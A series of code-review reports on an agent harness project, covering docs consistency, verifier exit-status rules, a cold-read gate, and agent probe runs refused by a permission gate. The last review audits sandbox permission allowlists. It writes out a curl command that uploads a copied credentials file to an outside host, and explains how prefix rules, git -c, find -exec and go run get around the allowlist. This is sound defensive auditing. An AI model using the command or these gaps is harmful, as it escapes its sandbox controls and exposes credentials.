# Review — update-from-zip-docs   (2026-09-28)

Range reviewed: 1cb2608..worktree

## Status: COMPLETE

## Verdict: APPROVE WITH NITS

The delivery-model rewrite (REQUIREMENTS R8/R9, ADR-038, `AGENTS.md` rule 1, `delivery.md` § The model, README's map and prose, `local.md`, `remote.md`) is internally consistent and each restatement of "two ways in" / "no third" was updated in the same diff — I could not find a surviving unqualified copy of the old wording. The CLI `usage` string and README's `## Install from a zip` section agree on flags and behaviour. The one real gap is that ADR-034's superseded claim ("a release binary installs the harness built into it, wherever it is run and whatever trees are on the machine") survives unqualified in one place README does not route through `delivery.md`, and the map draws the new zip edge solid despite the E2E verification recording it as run on only one machine.

## Findings

- **[medium / confidence: high]** `README.md:185` — "A RELEASE binary uses none of that: it installs the harness built into it, wherever it is run and whatever trees are on the machine, and refuses `--repo` rather than appearing to accept one (ADR-034)." This is the pre-ADR-038 rule verbatim. `.agents/docs/architecture/DECISIONS.md:340` (ADR-038 **Supersedes**) states plainly: "A release binary installs a tree on disk only when the operator names a zip with `--from-zip`; a recorded or discovered path is still refused." `delivery.md:32` carries the same carve-out. README's line was not updated to match: read alone it tells the operator a release binary can never install a tree on disk, which `--from-zip` on that same binary now does. `--repo` is still correctly refused (that half is unaffected), but the "whatever trees are on the machine" clause is stale. narrowed: `.agents/docs/architecture/DECISIONS.md:340` and `delivery.md:32` (both updated) → `README.md:185` (not updated).

- **[medium / confidence: medium]** `README.md` mermaid map, `zipPlace` node and the `harnessRepo -- "zip, downloaded by hand..." --> zipPlace` edge (README.md ~line 39) — drawn solid teal (in the `linkStyle 0,1,5,6,7` group), the same weight as the checkout and release-binary paths. `AGENTS.md` rule 4: "A dashed line is done by hand or limited to one machine; it turns solid in the commit that closes the gap, and nothing is drawn solid before it works for every place." `.agents/docs/testing/2026-09-28-verify-update-from-zip-e2e.md` § Not exercised lists "macOS" and "Antigravity reading the installed files" as unexercised, and the golden-path run was on the one Linux box only; `remote.md`'s four places include two Macs. If "works for every place" means verified there, the new edge does not yet qualify and per rule 4 should be dashed until a Mac run closes the gap (or the report states it was verified on one and generalizes safely, which it does not — it explicitly disclaims macOS).

- **[low / confidence: medium]** `README.md` § Daily commands, the `sh-agent update` table row (README.md:177) — describes checkout and release-binary behaviour and `--check`, but does not mention `--from-zip`, even though `main.go`'s usage string now documents it as a first-class mode of `update` and the table is the CLI's canonical command-by-command reference. The behaviour is documented elsewhere (§ Install from a zip), so this is a completeness gap in one table rather than a wrong statement.

1. Dead code — n/a — docs lens
2. Flow tracing — n/a — docs lens
3. Standards conformance — n/a — docs lens
4. Directory layout — n/a — docs lens

title: Review — v1.10.0-d3cc2b7-code (2026-09-28)
body:
# Review — v1.10.0-d3cc2b7-code   (2026-09-28)

Range reviewed: v1.10.0..d3cc2b7

## Status: COMPLETE

## Verdict: REQUEST CHANGES

The worst problem is in `agents/verifier.md:42`. It tells the verifier to tee a long suite's output to a file, and in practice the long suite is the Go test command. With `cmd | tee file`, `$?` is tee's exit status. The bullet just above (line 41) forbids "a pipe whose status hides the command's", and line 43 requires reading that same command's exit status. So an agent that follows line 42 as written reads exit 0 for a package that failed to build: `go test` prints `FAIL <pkg> [build failed]`, which has no `--- FAIL:` line to count, and that package is recorded as PASS. The new background-job check in the same bullet ("`jobs` prints nothing") can never fail on Claude Code. The new cold-reader early exit in `skills/feature/SKILL.md:80` contradicts three statements in the same skill, one of them in the same paragraph. No repository history (BUG ids, ADRs, dates, the repo's name) leaked into the deployed text. The rendered context at d3cc2b7 is 21,443 bytes, ends with GANNET, and is byte-identical to the probe's `defs/context-new.md`.

## Findings

- **[medium / confidence: high]** `agents/verifier.md:42` — The foreground long suite runs "with its output teed to a file under `.agents/scratch/`". A tee is a pipe, so the status the agent reads is tee's (0).
  - This contradicts line 41 ("never a pipe whose status hides the command's") and line 43, which requires reading the Go test command's exit status. The Go test command is exactly the suite that takes minutes (this repo's `go test -race ./...`).
  - Failure mode: a package with a build error prints `FAIL <pkg> [build failed]` with no `--- FAIL:` line. Tee's status (0) plus a zero `--- FAIL:` count gives a PASS line.
  - Fix: say "redirected to a file (`> <file> 2>&1; echo <name>=$?`), then read the file". If tee must stay, name `${PIPESTATUS[0]}` or `set -o pipefail`.

- **[medium / confidence: high]** `agents/verifier.md:42` — "every background job is ended (`kill` its PID, then `jobs` prints nothing)". Each Bash tool call on Claude Code starts a new shell (shell state does not persist between calls), so `jobs` in a later call prints nothing whether or not the suite is still running. A job started with the tool's own background option is not a shell job at all.
  - The check cannot fail. That breaks the global rule that silence from your own instrumentation is not evidence (context § Hard rules).
  - Fix: check the PID itself (`kill -0 <pid>` fails, or `ps -p <pid>` prints no process line). For a tool-level background task, use the tool's stop and list calls.

- **[medium / confidence: high]** `skills/feature/SKILL.md:80` — The new path: when the third cold-read report says `implementation ready` and every remaining gap is marked NON-BLOCKING, "tick the box … and proceed without asking". It contradicts:
  - line 15: "Four points always wait for the user: … the three-round cap of that check";
  - line 55: the box text is "design ready and implementation ready … or the user's same-turn override";
  - the same paragraph's last sentences: "Tick the Cold-reader check box only on both tokens or a quoted same-turn override".

  Its trigger is also unreadable as written. The cold-reader prompt (line 78) labels only the part-(3) questions BLOCKING/NON-BLOCKING and never the part-(1) gaps, and any gap forces `design needs revision`. So "every remaining gap is one the report itself marks NON-BLOCKING" depends on a label the report never produces. One agent will never take the path. Another will tick the box on `design needs revision` and skip a gate that line 15 says always waits for the user. "The user is told in the next report" does not say which artifact (the phase's `changes/` entry? the chat reply?).
  - Fix: if the early exit is intended, amend lines 15 and 55 and the tick sentence in the same edit. State the trigger in the report's own terms, for example "`implementation ready`, and every item still open is a question the report marks NON-BLOCKING, not a part-(1) gap", or have the prompt classify gaps too. Name where the user is told.

- **[medium / confidence: high]** `.agents/docs/testing/2026-09-28-verify-retro-apply.md` (behavioural table) — The counts of "calls sharing commands with `; echo <x>=$?`" (new 5, 3; old 0, 3) count attempts, not executions.
  - In the probe transcripts (`.agents/scratch/retro-probe/runs/verifier-*.jsonl`), the permission gate refused 12 subagent Bash calls across the four runs (3, 4, 1, 4): `Contains simple_expansion`, `Output redirection … needs approval`, `Contains command_substitution`.
  - The refusals include every attempt at the new rule's "redirected to its own file under `.agents/scratch/`" form (6 of 6). They also include all 3 shared calls in `verifier-new-2`, so the new behaviour never executed in that run. Only 3 shared calls ran under the new definition, all in `verifier-new-1`.
  - `verifier-old-1` is recorded as 0 shared calls, but its call 4 is `go vet ./...; echo "vet exit $?"; go test -race -v -count=1 ./...; echo "test exit $?"`, the same shape.
  - The log mentions no refusal. The project `AGENTS.md` § Testing (BUG-083) says a run refused at the permission gate proves nothing.
  - The log's conclusion (the control did not fail, and there is no measured behaviour change) still stands. But the evidence is misstated, and it hides something relevant: under default permissions the prescribed shared-call forms prompt, which costs the very turns the change is meant to save.
  - Separately, `context-ctl-2` answers "say 'ship' or 'deploy' and I'll run `/preflight`". The log files it under "puts the step on the operator". That is arguable (confidence medium), and the control contrast is weaker than 2-of-2 vs 0-of-2.
  - Fix: restate the table as executed vs refused per run, and add the refusals to Not exercised.

- **[low / confidence: medium]** `context/AGENTS.md:16` — The new clause gives a low finding a third outcome ("put to the operator as a one-line choice"). The same paragraph still says "Findings are fixed or rebutted in the report's `## Outcome`", and `skills/review/SKILL.md:62` (`--fix` round: "apply each finding or rebut it", with the states `fixed` / `rebutted` / `in flight` / `left`) has no state for it. Under `--fix`, two agents will differ on whether to apply the finding or stop and ask.
  - Fix: one clause naming how it is recorded, for example `left: operator — <choice asked>`, in both places.

- **[low / confidence: medium]** `agents/verifier.md:41` — "never `&&`" sits right beside "a leading `cd <dir> &&` … stays attached to every command after it". It is ambiguous whether a shared call may begin with `cd <dir> &&`. The ambiguity is harmless for status reading, since `cd` failing still shows in the next `echo`, but readers will differ.
  - Fix: "never `&&` between the commands".

- **[low / confidence: medium]** `agents/verifier.md:42` ("the tool's maximum, 10 minutes on Claude Code") and `context/AGENTS.md:33` ("Claude Code: `TaskStop`") name only the Claude Code mechanism. Both files deploy to Antigravity (the verifier through `derive.go`). There, the foreground-or-background cutoff has no stated maximum and "stopped" has no named call.
  - Fix: add the Antigravity counterpart, or say "the tool's maximum" without the number.

## Criteria

1. Dead code — pass. The change is rule text only. The replaced sentences (the old "each command as its own call" and "in the background" long-suite rule) have no surviving restatement in `context/`, `agents/`, `skills/`, `commands/`, `rules/` or `README.md` (grep over "own call", "in the background", "tee", "foreground").
2. Flow tracing — fail. The verifier's per-command status guarantee holds for the shared-call form (`; echo <name>=$?` per command, no `&&`, no status-hiding pipe), but it is broken by the tee prescribed for the long suite (finding 1). The `jobs` check cannot fail (finding 2). Probe provenance was checked: `defs/verifier-new.json` has the same body as `agents/verifier.md` at d3cc2b7 (differences are whitespace and `---` lines only), and `defs/context-new.md` is byte-identical to `sh-agent render` at d3cc2b7.
3. Standards conformance — fail. The cold-reader early exit contradicts three statements in the same skill (finding 3). The low-finding outcome is not reflected in `/review` Step 5 (finding 5). No repository-specific history in the deployed text: the added lines were grepped for `BUG-`, `ADR-`, `styrman`, `2026-` and `retro`, with no match. BUG-088 moved to the Graduated table, pointing at `skills/research/SKILL.md` § Step 1. The research bullet agrees with the other skills' "never carried over from another project" rules. Its "Record only the answer to the question" could be read as trimming Step 2's comparison, but the second sentence scopes it, so it is not a finding.
4. Directory layout — pass. No new files in deployed paths. The trail files are under `.agents/docs/{changes,handoffs,retros,testing}`.
5. Simplicity (DIY-except-security) — pass. No code and no dependencies. The feature skill's "inputs that always travel together are ONE input" rule does not conflict with `context/dev-setup.md`'s Secret Manager rule, which is about delivery, not the command's interface.
6. Decoupling — pass. Each rule lives in the file that owns the actor it governs (verifier in `agents/verifier.md`, research in its skill, review flow in context § DoD).

## Not examined

- The untracked files `.agents/docs/reviews/2026-09-28-review-v1.10.0-d3cc2b7-docs.md` and `.agents/docs/testing/2026-09-28-verify-v1.11.0-gate.md`: outside the range and not read.
- The in-range trail files `.agents/docs/changes/2026-09-28-2222-retro-apply.md`, `.agents/docs/retros/2026-09-28-retro.md` and `.agents/docs/handoffs/2026-09-28-2057-v1.10.0-released.md`: not read. `bugs/INDEX.md` was checked only for the BUG-088 row.
- `go test` / `go vet` were not re-run by this review; only `sh-agent render` was run.
- The context-probe transcripts were read only for their final answers, not their tool calls.
- Antigravity behaviour of every changed rule.

## Outcome

1. **`tee` hides the suite's status: fixed.** A long suite is now `> <file> 2>&1; echo <name>=$?`, read from the file, and "never `tee`" is stated.
2. **`jobs` proves nothing: fixed.** A shell job is ended by `kill <pid>`, then `kill -0 <pid>` failing. A tool-level background job is ended by the tool's own stop call.
3. **Cold-read cap early exit contradicted the gate: fixed.**
   - Line 15 now says the cap waits "unless its third report is `implementation ready`, Step 3".
   - The box text and the tick sentence both name the third case.
   - The trigger uses the report's own token: `implementation ready`, meaning no BLOCKING question.
   - The user is told in the phase's `changes/` entry and the next chat reply.
4. **The verify log counted attempts, not executions: fixed.** The table is restated as refused, attempted and executed per run. The refusals are named, the control-2 wording is noted, and the unmeasured forms go under Not exercised. The shared-call rule was narrowed to output read inline, the form the gate did not refuse when it ran.
5. **Low, no recorded state for "put to the operator": fixed.** It is recorded `left: operator — <choice>` in the context clause and in `skills/review/SKILL.md`'s round rule; `left` is already one of that skill's states.
6. **Low, `&&` ambiguity: fixed.** It now reads "never `&&` between the commands".
7. **Low, Claude-Code-only wording: fixed.** "Up to the tool's maximum", without the number. The context says "Claude Code: `TaskStop`; elsewhere the CLI's own stop".

title: Review — v1.11.0-gate-r2 (2026-09-28)
body:
# Review — v1.11.0-gate-r2   (2026-09-28)

Range reviewed: d3cc2b7..cb6cf73

## Status: COMPLETE

## Verdict: REQUEST CHANGES

The worst problem is the fix for the cold-read cap (`skills/feature/SKILL.md:80`). It asks the user less often than both the retro text it replaced and the fix the round-1 finding suggested. When the third report ends `implementation ready`, every open gap is now turned into a D-row and the work proceeds without asking. That includes part-(1) gaps, which the brief defines as "what must be decided before implementation starts", and part-(2) scope items. So a third report of `design needs revision` plus `implementation ready` ticks the no-code gate with design gaps still open. A scope-creep item gets a D-row `by: cold read round 3`, and the brief's own test ("a gap unless a D-row says who asked for it") then counts it as asked for. That lets BUG-042 (b) through again.

The second problem is in `agents/verifier.md`. The verifier fix prescribes the unquoted `; echo <name>=$?`, and for a long suite adds a redirect. The probe transcripts show the permission gate refused the unquoted form 6 of 6 times, and allowed the quoted form 5 of 5 times when there was no redirect. The verify log reads the evidence as "inline vs redirected", so the text was narrowed on the wrong variable and still prescribes the refused form.

Round-1 findings 1, 2, 5, 6 and 7 are fixed correctly, and so is finding 4's arithmetic.

## Round-1 findings against their Outcome

| # | Outcome claim | Checked | Result |
|---|---|---|---|
| 1 | `tee` replaced by `> <file> 2>&1; echo <name>=$?`, then read | `agents/verifier.md:42` | Fixed. The status is now the suite's own. See new finding 2 on the unquoted form. |
| 2 | `jobs` replaced by `kill <pid>` then `kill -0 <pid>` failing, plus the tool's own stop | `agents/verifier.md:42` | Fixed. `kill -0` checks by PID and works across shells. |
| 3 | Early exit consistent with lines 15 and 55 and the tick sentence; trigger in the report's own token; user told in `changes/` and chat | `skills/feature/SKILL.md:15,55,80` | The contradiction is gone: all three places now agree. The trigger was widened past both the retro's and the finding's scope. See new finding 1. |
| 4 | Table restated as refused / attempted / executed | `.agents/scratch/retro-probe/runs/verifier-*.jsonl` | Numbers recounted and correct. Calls: 13/11/4/9. Errors: 3/5/1/4 (13 in total, one of them a git error, which the log discloses). Attempted/executed: 5/3, 3/0, 3/2, 3/0. See new finding 3 on what "shared" counts. |
| 5 | `left: operator — <choice>` recorded in the context and in `/review` | `context/AGENTS.md:16`, `skills/review/SKILL.md:62` | Fixed. Both name the same state, and `left` is already in the ledger vocabulary. |
| 6 | "never `&&` between the commands" | `agents/verifier.md:41` | Fixed. |
| 7 | Claude-Code-only wording | `agents/verifier.md:42`, `context/AGENTS.md:33` | Fixed. "Up to the tool's maximum"; "elsewhere the CLI's own stop". No other restatement of "10 minutes", `jobs` or `TaskStop` is left in `context/`, `agents/` or the non-vendored `skills/`. |

## Findings

- **[medium / confidence: high]** `skills/feature/SKILL.md:80` (with `:15`, `:55`) — The early exit now fires on `implementation ready` alone and turns "each gap and question still open" into a D-row, with no question to the user.
  - The brief at `:78` lets a report end `design needs revision` + `implementation ready`: gaps and BLOCKING questions are counted separately.
  - Part (1) defines a gap as "what must be decided before implementation starts", so proceeding with one open contradicts the brief's own definition.
  - Part (2) says a scope item "is a gap unless a D-row says who asked for it". A D-row `by: cold read round 3` satisfies that test for extra scope nobody requested. That reopens BUG-042 (b), "plan grew past the brief … the cold reader never asked", whose prevention says a gate must count something a headless run cannot argue its way around.
  - It also skips the cap's own `Open:` path, where "the phases that depend on them wait" (`:15`). An undecided gap written as a D-row carries no wait, and the text does not say who decides its content.
  - The retro text this replaced (d3cc2b7) scoped the exit to items the report marks NON-BLOCKING. Round 1 suggested "not a part-(1) gap". The Outcome's "meaning no BLOCKING question" is a wider rule, and nobody decided on it.
  - Fix: make the trigger "`implementation ready` and `design ready` was withheld only for items the report lists as NON-BLOCKING questions". Simpler: "the third report has zero part-(1) and part-(2) gaps and says `implementation ready`". Anything else goes to the user as before. If the wider rule is intended, it is a gate change for the operator: put it to them.

- **[medium / confidence: medium]** `agents/verifier.md:41-42` — Both bullets prescribe `; echo <name>=$?` unquoted.
  - In the probe transcripts, Claude Code's permission gate refused every unquoted `=$?` ("Contains simple_expansion"): 6 of 6 (`verifier-new-2` calls 2, 3, 5; `verifier-old-2` calls 3, 4, 7).
  - It allowed every double-quoted `echo "<name>=$?"` that had no redirect: 5 of 5 (`verifier-new-1` calls 7, 9, 10; `verifier-old-1` calls 2, 4).
  - Every redirect to a file was refused ("needs approval").
  - The corrected log (`.agents/docs/testing/2026-09-28-verify-retro-apply.md`, paragraph under the verifier table) explains the narrowing as "shared calls are only for output read inline". But the inline shared calls in `-new-2` and `-old-2` were refused as well. Quoting separated allowed from refused, not inline versus redirected.
  - The new long-suite form `> <file> 2>&1; echo <name>=$?` combines both refused constructs.
  - Failure mode: under a gate like the probe's, a verifier that follows the text literally loses a turn on every status echo and on the long suite. That is the turn-limit failure the retro change was meant to answer.
  - No behavioural run covers the cb6cf73 definition. The probe ran d3cc2b7's, and the changes entry lists only `go test` and the size test. `AGENTS.md` § Testing requires a behavioural run for an `agents/*.md` change.
  - Confidence is medium because the real operator's permission settings may allow both constructs.
  - Fix: prescribe `; echo "<name>=$?"` (quoted) in both bullets. Correct the log's causal sentence. Run the behavioural probe on the cb6cf73 definition before claiming the narrowing helps.

- **[low / confidence: high]** `.agents/docs/testing/2026-09-28-verify-retro-apply.md` (table column "Shared calls … executed") — Under the new definition, each of the 3 "executed shared calls" runs a single verification command followed by its echo (`verifier-new-1` calls 7, 9, 10: gofmt, vet, test separately). No call under the new definition ran two verification commands together. `verifier-old-1` call 4 did (vet, test and cover in one call).
  - The column therefore does not measure sharing. The log's "the old definition's verifier already combined commands" understates it: in this probe the new definition combined fewer commands than the old one.
  - Fix: count calls that hold two or more verification commands, or rename the column "status-echo calls".

## Criteria

1. Dead code — pass. Rule text only. The replaced phrases (the `tee` form, "redirected to its own file" for shared calls, `jobs`, "10 minutes") have no surviving restatement in `context/`, `agents/`, the non-vendored `skills/`, `commands/`, `rules/` or `README.md` (grep over `tee`, `$?`, `jobs`, `kill -0`, `10 minutes`, `TaskStop`, `own stop`). The `tee` lines in `skills/golang/references/` pipe benchmarks, not verification status.
2. Flow tracing — fail (finding 2). Status reading is now correct end to end: per-command echo, redirect instead of tee, no `&&` between the commands. `kill -0` checks the process itself. But the prescribed echo form is the one the measured gate refuses. The Test-counts bullet (`:44`, the output saved to `go-test-<n>.txt`) agrees with the long-suite redirect.
3. Standards conformance — fail (finding 1). The early exit now agrees with `:15`, `:55` and the tick sentence (the round-1 contradiction is gone), but it contradicts the brief's definition of a gap at `:78` and reopens BUG-042 (b). `left: operator — <choice>` agrees between `context/AGENTS.md:16` and `skills/review/SKILL.md:62`. Other restatements of the cold-read cap were grepped (`cold.?read`, `both tokens`, `design ready`, `implementation ready`, `three-round cap`): `agents/reviewer.md:31` and `skills/bug/SKILL.md:15` do not restate the tick condition, so nothing is stale. Rendered context at cb6cf73: 21,517 bytes, ends with GANNET. `TestRenderedContextFitsAntigravityBlock` and `TestHarnessMap` pass (run by this review).
4. Directory layout — pass. New files are trail files under `.agents/docs/{changes,reviews,testing}`.
5. Simplicity (DIY-except-security) — pass. No code and no dependencies.
6. Decoupling — pass. Each rule stays in the file that owns its actor.

## Not examined

- `go vet` and the full `go test -race ./...` were not re-run. Only the two named tests and `sh-agent render` were.
- Sandbox CLI starts and the real-home smoke checks for the `context/` change; Antigravity behaviour of every changed rule.
- `.agents/docs/testing/2026-09-28-verify-v1.11.0-gate.md` and `.agents/docs/reviews/2026-09-28-review-v1.10.0-d3cc2b7-docs.md` were read only for their verdicts and Findings sections. The docs review has no findings, so it needs no `## Outcome`.
- The retro record (`.agents/docs/retros/2026-09-28-retro.md`) holds no cold-read text, so proposal 5's original intent was taken from the d3cc2b7 skill text alone.
- The `context-*` probe transcripts were not re-read.

## Outcome

1. **Cold-read early exit widened past the gate: struck.** The operator struck the mechanism (retro proposal 5) after this second round; `skills/feature/SKILL.md` lines 15, 55 and 80 are back to the v1.10.0 text (`1d03e7a`).
2. **Shared-call form refused by the permission gate: struck.** The operator struck the mechanism (retro proposal 3); `agents/verifier.md:41` is back to "run each command as its own call" (`1d03e7a`). `maxTurns` 30 → 45 answers the turn-limit failures instead.
3. **Low, executed shared calls each held one command: moot.** The rule is gone, and the verify log's table is now labelled attempted / executed.

title: Review — v1.6.0-a9717cc-code (2026-09-28)
body:
# Review — v1.6.0-a9717cc-code   (2026-09-28)

Range reviewed: v1.6.0..a9717cc

Scope: the 8 paths outside `.agents/docs/` (`AGENTS.md`, `REQUIREMENTS.md`, `agents/changelog.md`, `context/AGENTS.md`, `skills/{cloud-run-deploy,handoff,init-project,preflight}/SKILL.md`; +24/-18 net), commit by commit: c65a8fd (REQUIREMENTS R2), 17fa89b (AGENTS.md trim, cloud-run-deploy numbering), e5a49d4 (time-sortable names), 9a17e0a (handoff Step 3.1, preflight dirty-tree dispatch), c29a698 (ROADMAP only; nets to zero across the range), a9717cc (AGENTS.md § Testing graduation). 894fc9b, 914dc90, c1c01d8 and c86d3dd touch only `.agents/docs/`.

Prior report `2026-09-28-review-time-sortable-names-code.md` covers `17fa89b..e5a49d4` limited to `context agents skills`. That range is exactly commit e5a49d4, and the filter covers every non-docs file in it except `ROADMAP.md`, whose change nets to zero across the range. So it subsumes e5a49d4's five skill/agent/context files. Its one finding (handoff Step 3.1) is fixed in 9a17e0a, and I checked that fix here. I still read e5a49d4's files in the cumulative diff because a release gate has to judge the net state.

## Status: COMPLETE

## Verdict: APPROVE WITH NITS

Nothing in the range is broken at correctness or security level. The one real gap is low severity, in `agents/changelog.md` (e5a49d4, missed by the earlier review). Rule 1 now says a dispatch that gives only a date gets a date-only file name, "flagged in your reply". But the agent's `## Output` section lists everything the reply carries and names only `DATE-UNKNOWN`. So the flag the rule relies on may never reach the dispatcher. The REQUIREMENTS R2 edit is operator-approved, and ADR-037 lands in the same commit and quotes the approval. The a9717cc graduation is consistent with the three bug records and the INDEX Graduated rows. `TestRenderedContextFitsAntigravityBlock` passes at 20498/22000 bytes.

## Findings

- **[low / confidence: medium]** `agents/changelog.md:22` vs `agents/changelog.md:94` — Rule 1 says: "A dispatch that gives only a date gets a date-only file name, flagged in your reply." The Output section at `:94` lists what the reply contains: records appended, deferred work, "and any `DATE-UNKNOWN` entry so the dispatcher can fix it". It does not list the date-only flag.
  - **How it fails:** only preflight (`skills/preflight/SKILL.md:40`, `:86`) says to pass the stamp. The other dispatch sites do not: `skills/handoff/SKILL.md:63`, `skills/bug/SKILL.md:53`, `skills/feature/SKILL.md:88,98`. A dispatcher that passes a bare date from `date +%F` gets a date-only `changes/` file. Under the new context rule (`context/AGENTS.md:65`), that file sorts as older than every timed entry of its day. The agent follows the Output list, so the misfiled newest entry goes unreported, and resume's "three newest `changes/`" can pass over it.
  - **Accepted in the plan:** the plan names "an agent writes a date-only name anyway" as a failure mode (`plans/2026-09-28-time-sortable-trail-names.md:99`). But the mitigation it relies on, the flag, is not in the reply contract.
  - **Fix:** add "any date-only file name (the dispatch gave a date, not a stamp)" to the `:94` Output line.

No other findings. Checked and clean:
- **`REQUIREMENTS.md:11` (c65a8fd):** the R2 sentence is operator-approved, quoted in ADR-037 (`architecture/DECISIONS.md:319`), and in the same commit as the ADR. Its clause "a template `AGENTS.md` never sits beside source" is met: the only template is `skills/init-project/assets/AGENTS.md`, which ADR-037's Consequences names as staying under `assets/`.
- **`AGENTS.md:18` rule 6 (17fa89b):** the trim keeps the rule, and its why-pointer resolves (`.agents/docs/retros/2026-09-18-retro-2.md` exists).
- **`AGENTS.md:31` go.mod paragraph (17fa89b):** the trim keeps the ADR-029 reason and the never-pin rule. "older than go1.24.6 or go1.25.8" is loose wording, but it agrees with the `clean on go1.25.8+` comment at `:28`. No failure mode.
- **`skills/cloud-run-deploy/SKILL.md:37` (17fa89b):** the orphan bullet is now item 6 of a correctly numbered 1–6 list. Nothing refers to cloud-run-deploy Pre-flight items by number.
- **`skills/handoff/SKILL.md:62` (9a17e0a):** the fix for the prior finding reconciles Step 3.1 with the Step 5 save line (`:145`).
- **`skills/preflight/SKILL.md:40` (9a17e0a):** the dirty-tree changelog dispatch now passes the stamp, the same as `:86`.
- **`AGENTS.md:64-67` (a9717cc):**
  - BUG-087, BUG-090 and BUG-091 appear in the INDEX Graduated table (`bugs/INDEX.md:100-102`) pointing at this paragraph, and are gone from the main table. Their records keep `status: fixed`, which matches the convention of all 90 fixed records, including graduated BUG-011.
  - The settings path `~/.gemini/antigravity-cli/settings.json` matches BUG-091 and the sandbox log.
- **Old name forms:** a sweep of README, specs, deploy guides, the testing guide, `skills/*/SKILL.md`, `skills/*/assets`, `commands`, `rules`, `agents` and `context` found no `handoffs/` or `changes/` name without the time.

## Criteria

1. **Dead code** — pass. The range is prose only. The removed changelog rule 2 (`run date +%F yourself`) was unexecutable, since the agent has no Bash (BUG-089), so deleting it was correct. No orphaned text found.
2. **Flow tracing** — pass with the finding above. I traced the stamp from the `date +%F-%H%M` producers (preflight `:40`, `:86`; handoff Step 3.1 and Step 5) to the consumer (changelog rule 1, file name and `date:` frontmatter). The reply path back to the dispatcher is the one gap. The init-project Step 1 count feeds the Step 7 summary (`:24` → `:108`), and both ends are present.
3. **Standards conformance** — pass.
   - Project `AGENTS.md` rules: no hooks or CI, docs root, scratch. The new-rule graduation followed the INDEX convention.
   - Describing-text sweep clean (above).
   - Context size test passes: 20498 bytes against the 22000 budget, run by me with `go test ./internal/harness -run 'TestRenderedContextFitsAntigravityBlock|TestHarnessMap' -count=1`, exit ok.
4. **Directory layout** — pass. No new files outside `.agents/docs/`.
5. **Simplicity (DIY-except-security)** — pass. There is no Go change and no new dependency. The shell additions are `date` and `grep`. No auth or crypto surface.
6. **Decoupling** — pass. Each skill or agent states the naming convention for its own writer, and the context holds the single ordering rule. This fits the project rule that adding a skill or agent is a file drop.

## Not examined

title: Review — v1.7.0-381e86d-code (2026-09-28)
body:
# Review — v1.7.0-381e86d-code   (2026-09-28)

Range reviewed: v1.7.0..381e86d

Source-side paths: `context/AGENTS.md` (one clause in § Git) and `.agents/docs/testing/skill-matrix.md` (Procedure step 2). Evidence: `.agents/docs/testing/2026-09-28-verify-token-rule-and-matrix.md`. Also read: the change entry `changes/2026-09-28-1614-token-rule-and-matrix.md`, project `AGENTS.md` § Testing, `skills/preflight/SKILL.md:40`, `REQUIREMENTS.md` (grep), `bugs/INDEX.md` (grep), and the permission-rule parser in the installed Claude Code binary (2.1.283).

## Status: COMPLETE

## Verdict: REQUEST CHANGES

The `context/AGENTS.md` clause is sound: it matches preflight's list, the behavioural evidence (3 of 3 stop-and-ask against a 3 of 3 control) supports it, and the size test passes. The matrix procedure is the problem. The Claude rule `Bash(curl http://localhost:*)` is valid syntax, but it is the legacy `:*` prefix form, so its prefix is `curl http://localhost` and it matches only when a space or the end of the command follows. It therefore allows none of the port-qualified requests it was written for (`curl http://localhost:8080/...`), while still allowing `curl http://localhost <any URL> -T <file>`. Separately, the `bash` and `python` rows tell the agent to run `bash -n` and `python3 -m py_compile`, and both commands were removed from both lists. On Antigravity those rows are auto-denied, and under the procedure's own rule such a run does not count. The procedure's fix path (add the denied command by name) then brings back the grant the same line says was removed for security. The Claude list change was never run, even though BUG-087/090/091 (now in `AGENTS.md` § Testing) say a sandbox setup must prove itself before its output counts.

## Findings

- **[medium / confidence: high]** `.agents/docs/testing/skill-matrix.md:13`: `"Bash(curl http://localhost:*)"` and `"Bash(curl http://127.0.0.1:*)"` do not match the commands they are meant to allow.
  - **How Claude Code parses it.** Claude Code 2.1.283 parses a rule ending in `:*` with `^(.+):\*$` into `{type:"prefix", prefix:"curl http://localhost"}`. It matches with `cmd === prefix || cmd.startsWith(prefix + " ")` (read from the bundled parser, functions `Fye`/`Kmn`/`_Le`).
  - **What that means.** `curl http://localhost:8080/healthz` does not match, because the character after the prefix is `:`, not a space. `curl -s http://localhost:8080/...` does not match either. The rule allows only port 80 and forms like `curl http://localhost https://elsewhere -T <home>/.claude/.credentials.json`, because curl takes several URLs and a `-T`/`-d @file` upload.
  - **Effect.** The rule neither permits the local probes nor stops the exfiltration shape it names.
  - **Fix.** Pick one:
    - Drop curl from the Claude list. No scenario prompt requires running curl: the `bash` row only writes it into a script.
    - Or use the wildcard form `Bash(curl http://localhost:8080/*)` and record that it is a convenience, not a boundary. Any trailing `*` still admits extra URLs and upload flags.
  - **Verification.** Verify by a run whose transcript shows the curl call allowed.
- **[medium / confidence: high]** `.agents/docs/testing/skill-matrix.md:45-46` against `:13-14`: the `bash` row ("Run bash -n on it") and the `python` row ("Run python3 -m py_compile on it") need commands that both lists no longer grant.
  - **Antigravity.** The run hits an "auto-denied" line. Per `:14`, "a run counts only when its stderr has no 'auto-denied' line", so these two rows can never produce a counted PASS. `AGENTS.md` § Testing forbids saying "complete" or "all skills" until the full matrix has run.
  - **Claude.** The check still passes, because the harness runs `bash -n` itself, but the step the prompt asks for is refused, so the row no longer tests it. The earlier matrix (`2026-09-03-verify-sandbox-skills.md:39-40`) exercised exactly this.
  - **Contradiction.** The procedure's remedy, "gets that one command added here, by name", re-grants `bash`/`python3`, which `:13` says were removed because "each runs anything".
  - **Fix.** Pick one:
    - Resolve it now in the procedure with narrow Claude prefixes `Bash(bash -n:*)` and `Bash(python3 -m py_compile:*)`, which are valid prefix rules followed by a space. For agy, either grant `command(bash)`/`command(python3)` for those two rows only, with the reason stated, or change the two prompts so they do not execute.
    - Or name these two rows as known exceptions.
- **[medium / confidence: high]** `.agents/docs/testing/skill-matrix.md:13`: "No `bash`, `python3` or unrestricted `curl` either: each runs anything, and the sandbox home holds copied credentials". This implies the remaining list does not run anything, which is false.
  - **Claude.** `Bash(go:*)` permits `go run`/`go test` of code the agent itself writes under `acceptEdits`. `Bash(git:*)` permits `git -c core.pager=…`/aliases. Claude Code's own validator warns on this for git: "options such as -c and --exec-path can run arbitrary commands". `Bash(find:*)` permits `-exec`.
  - **Antigravity.** The same holds for `command(go)`, `command(git)` and `command(find)` on `:14`.
  - **Why it matters.** A procedure that states a security property it does not have will be read as that guarantee (the global context's describing-text rule).
  - **Fix.** Reword it to the true claim: the lists remove the gratuitous interpreters, and arbitrary code execution remains through `go`/`git`, so the credential copy is protected by being deleted after the batch, not by the allowlist.
